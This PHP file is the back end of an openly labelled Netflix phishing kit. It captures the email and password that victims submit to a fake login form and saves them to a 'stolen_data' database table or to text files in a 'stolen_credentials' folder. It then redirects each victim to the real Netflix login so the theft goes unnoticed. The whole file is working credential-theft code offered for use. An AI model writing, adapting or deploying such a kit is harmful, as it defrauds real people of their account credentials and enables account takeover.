<?php
/**
*MIT License
*
*Copyright (c) 2022 It0sh1
*Permission is hereby granted, free of charge, to any person obtaining a copy
*of this software and associated documentation files (the "Software"), to deal
*in the Software without restriction, including without limitation the rights
*to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
*copies of the Software, and to permit persons to whom the Software is
*furnished to do so, subject to the following conditions:
*
*(The above copyright notice and this permission notice shall be included in all
*copies or substantial portions of the Software.
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,&*
*FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*SOFTWARE.
*/
/************************************/
# Phishingtemplates /netflix         #
# author: It0sh1                     #
# github: https://github.com/it0sh1  #
/*************************************/

// include configuration file
require('conf.inc.php');

// making class
class Phished
{

  // making redirect method
  public static function urlredirect(string $url)
  {
    header('Location: '.$url.'');
  }

  // making phishing script
  public static function GetPhished()
  {

    // include some vars
    global $db_host;
    global $db_user;
    global $db_pass;
    global $db_name;
    global $use_db;
    global $netflix_link;

    if(isset($_POST['submitlogin']))
    {

      // getting stolen user input
      $stolen_user_credential_email_netflix = $_POST['userLoginId'];
      $stolen_user_credential_pass_netflix  = $_POST['password'];

      // when we gonna use database
      if($use_db === true)
      {
        $connecting = mysqli_connect("$db_host", "$db_user", "$db_pass", "$db_name")
        or die('Connection failed bitch :(' . mysqli_connect_error());

        // making SQL
        $sql = "INSERT INTO stolen_data (stolen_username, stolen_password)
        VALUES ('$stolen_user_credential_email_netflix', '$stolen_user_credential_pass_netflix');";

        // When inserting sql query succeed and is true:
        if(mysqli_query($connecting, $sql) === true)
        {

          // redirect victim to the normal netflix login
          self::urlredirect($netflix_link . "/login");
          exit; // EXIT

        } else {

          // Showing error:
          echo "Something went very wrong :(, check the error: ".mysqli_connect_error();
        }

      // When $use_db is normally set to false
      // email/numbers/passwords will be saved in a folder
      } else {

        if(empty($stolen_user_credential_email_netflix) OR empty($stolen_user_credential_pass_netflix))
        {
          // hang on the same page
          self::redirect('login');
          exit; // EXIT

        } else {

          // create folder for credentials
          $stolen_user_credential_folder = "stolen_credentials/";

          // check if stolen_credentials folder not exists
          if(!is_dir($stolen_user_credential_folder))
          {

            // make folder
            mkdir($stolen_user_credential_folder);

            // creating .txt with random hashed name
            $randomhashtextfile = uniqid().'.txt';

            // now we making filehandler to put our phished credentials in it
            $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

            // creating text
            $data1 = "Username/Email: " . $stolen_user_credential_email_netflix . "\n";
            fwrite($filehandler, $data1);

            // second data text
            $data2 = "Password: " . $stolen_user_credential_pass_netflix . "\n";
            fwrite($filehandler, $data2);
            // close handler
            fclose($filehandler);

            // redirect victim to login page
            self::urlredirect($netflix_link . "/login");
            exit; // EXIT

          // When folder does exists
          } else {

            // creating .txt with random hashed name
            $randomhashtextfile = uniqid().'.txt';

            // making filehandler again
            $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

            // creating text
            $data1 = "Username/Email: " . $stolen_user_credential_email_netflix . "\n";
            fwrite($filehandler, $data1);

            // second data text
            $data2 = "Password: " . $stolen_user_credential_pass_netflix . "\n";
            fwrite($filehandler, $data2);
            // close handler
            fclose($filehandler);

            // redirect victim to login page
            self::urlredirect($netflix_link . "/login");
            exit; // EXIT
          }
        }
      }
    }
  }
}

Phished::GetPhished();
?>
